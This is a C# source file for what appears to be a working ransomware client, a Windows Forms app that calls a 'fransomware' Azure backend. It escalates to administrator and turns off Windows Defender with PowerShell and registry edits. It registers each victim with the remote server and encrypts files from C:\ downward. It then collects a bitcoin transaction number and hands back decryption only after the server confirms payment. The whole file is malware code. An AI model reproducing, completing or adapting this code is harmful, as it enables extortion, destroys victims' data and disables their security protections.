using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using Microsoft.Win32;

namespace myApp
{
    public partial class Form1 : Form
    {
        Enc enc;
        private string path = @"C:\";       
        private string J_N = @"c:\J_N.txt";
        private string J_N1 = @"c:\J_N1.txt";
        private int myID;
        private int chosenCategory;
        public Form1()
        {

            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            if (!IsAdministrator())   /// we are not sure it works
            {
                OnSubmit(appPath, true);
                File.Delete(J_N);
                File.Delete(J_N1);
                Application.Exit();
                return;
            }

            diable_WD(); // disable windows defender

            System.Diagnostics.Process.Start("https://www.amazon.com");

            if (!File.Exists(J_N)) // first time
            {
                initialConnection();
                File.AppendAllLines(J_N, new[] { myID.ToString() });
                enc = new Enc(path,true);

                setJobConnection(); // updates the victim's job in the database
            }
            else // already encrypted
            {
                
                enc = new Enc(path, false);
                updateID(); // get the id from file, store it in myID

            }

            InitializeComponent();

        }

        private void diable_WD()
        {
            try
            {
                OnSubmit("/C PowerShell Set-MpPreference -DisableRealtimeMonitoring 1", false); // Disable windows defender
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1);

            }
            catch { }

        }

        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public string OnSubmit(string command, bool asAdmin)
        {
            return RunProcess("C:\\windows\\system32\\cmd.exe", command, true);
        }

        public string RunProcess(string cmd, string arguments, bool asAdmin)
        {
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appDir = Path.GetDirectoryName(appPath);
            Directory.SetCurrentDirectory(appDir);

            System.Diagnostics.Process p = new System.Diagnostics.Process();

            p.StartInfo.FileName = cmd;

            p.StartInfo.Arguments = arguments;

            p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            p.StartInfo.CreateNoWindow = true;

            p.StartInfo.RedirectStandardOutput = true;

            p.StartInfo.RedirectStandardError = true;

            p.StartInfo.UseShellExecute = false;
            if (asAdmin)
            {
                p.StartInfo.RedirectStandardOutput =false;
                p.StartInfo.RedirectStandardError = false;
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
            }
            p.Start();

            // must have the readToEnd BEFORE the WaitForExit(), to avoid a deadlock condition
            /*
            string output = p.StandardOutput.ReadToEnd();
            string stderrx = p.StandardError.ReadToEnd();



            p.WaitForExit();



            //if there is an error display it

            if (p.ExitCode != 0)

            {
                return stderrx;
                //Response.Write("<p class=\"whiteclass\"> exit code: " + p.ExitCode + "<br><br>Errors:<br>" + stderrx + "</p>");
            }*/

            string output = "";
            return output;
        }

        private void updateID() //get the id from J_N
        {
            string str = File.ReadLines(J_N).Take(1).First();
            int x;
            Int32.TryParse(str, out x);
            myID = x;
        }


        private void initialConnection()
        {
            WebClient client = new WebClient();
            string url = "https://fransomware.azurewebsites.net/api/initialConnection";
            client.Encoding = Encoding.UTF8;

            myID = Convert.ToInt32(client.UploadString(url, "new customer"));
        }

        private void setJobConnection()
        {
         
            string url = "https://fransomware.azurewebsites.net/api/setJob";
         
            using (WebClient client = new WebClient())
            {
                int job = (int)enc.getJob();
                client.QueryString.Add("id", myID.ToString());
                client.QueryString.Add("job", job.ToString());
                var data = client.UploadValues(url, "POST", client.QueryString);

            }
              
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e) //decrypt
        {
            button1.Enabled = false;
            string url = "https://fransomware.azurewebsites.net/api/Decrypt";

            using (WebClient client = new WebClient())
            {
                byte[] bytes = File.ReadAllBytes(J_N1);
                char[] padding = { '=' };
                string str1 = Convert.ToBase64String(bytes.Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str2 = Convert.ToBase64String(bytes.Skip(128).Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str3 = Convert.ToBase64String(bytes.Skip(256).Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str4 = Convert.ToBase64String(bytes.Skip(384).Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str5 = Convert.ToBase64String(bytes.Skip(512).Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str6 = Convert.ToBase64String(bytes.Skip(640).Take(128).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');
                string str7 = Convert.ToBase64String(bytes.Skip(768).ToArray())
                    .TrimEnd(padding).Replace('+', '-').Replace('/', '_');

                client.QueryString.Add("id", myID.ToString());
                client.QueryString.Add("category", chosenCategory.ToString());

                client.QueryString.Add("AES1", str1);
                client.QueryString.Add("AES2", str2);
                client.QueryString.Add("AES3", str3);
                client.QueryString.Add("AES4", str4);
                client.QueryString.Add("AES5", str5);
                client.QueryString.Add("AES6", str6);
                client.QueryString.Add("AES7", str7);
                
                byte[] data = client.UploadValues(url, "POST", client.QueryString);
                File.WriteAllBytes(J_N1, data);
                enc.decryptJ_N();
                enc.decryptByCategory(path, chosenCategory);

                textBox.BackColor = Color.White;
                textBox.ForeColor = Color.Green;
                textBox.Text = "Your chosen files were decrypted successfully!";

                File.Delete(J_N);
                File.Delete(J_N1);
                
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e) // decryption request
        {
                       
            string url = "https://fransomware.azurewebsites.net/api/decryption_request";

            int idx = priority.SelectedIndex;
            if (idx<0){
                errorBox.ForeColor = Color.Red;
                errorBox.BackColor = Color.White;
                errorBox.Text = "Select priority";
                return;
            }
            chosenCategory = idx;
            string tranNum = transactionNum.Text;
            if(tranNum == "") // should check if the string is valid
            {
                errorBox.ForeColor = Color.Red;
                errorBox.BackColor = Color.White;
                errorBox.Text = "Enter transaction number";
                return;
            }

            using (WebClient client = new WebClient())
            {
                client.QueryString.Add("id", myID.ToString());
                client.QueryString.Add("category", idx.ToString());
                client.QueryString.Add("transaction", tranNum);
                var data = client.UploadValues(url, "POST", client.QueryString);
            } 

            errorBox.BackColor = Color.White;
            errorBox.ForeColor = Color.Green;
            errorBox.Text = "Your request has been sent";
            button3.Enabled = true;
            button2.Enabled = false;
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e) /// check status
        {
            string url = "https://fransomware.azurewebsites.net/api/CheckRequestStatus";
            using (WebClient client = new WebClient())
            {
                int idx = priority.SelectedIndex;
                if (idx < 0)
                {
                    errorBox.ForeColor = Color.Red;
                    errorBox.BackColor = Color.White;
                    errorBox.Text = "Select priority";
                    return;
                }

                client.QueryString.Add("id", myID.ToString());
                client.QueryString.Add("category", idx.ToString());
                var data = client.UploadValues(url, "POST", client.QueryString);
                string str = Encoding.UTF8.GetString(data);
                textBox.BackColor = Color.White;
                if (str == "PENDING" || str == "pending")  /// pending
                {
                    textBox.ForeColor = Color.Green;                   
                    textBox.Text = "Your request hasn't been checked yet. Please be patient!";
                }
                if (str == "ERROR"|| str == "error") // error
                {
                    textBox.ForeColor = Color.Red;
                    textBox.Text = "Your request was declined, you haven't sent the correct amount of bitcoins";
                }
                if (str == "DECRYPT" || str == "decrypt") // decrypt
                {
                    textBox.ForeColor = Color.Green;
                    textBox.Text = "Your request was confirmed, please click \"Decrypt\" button";
                    button1.Enabled = true;
                    button3.Enabled = false;
                }
            }
        }

        private void priority_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
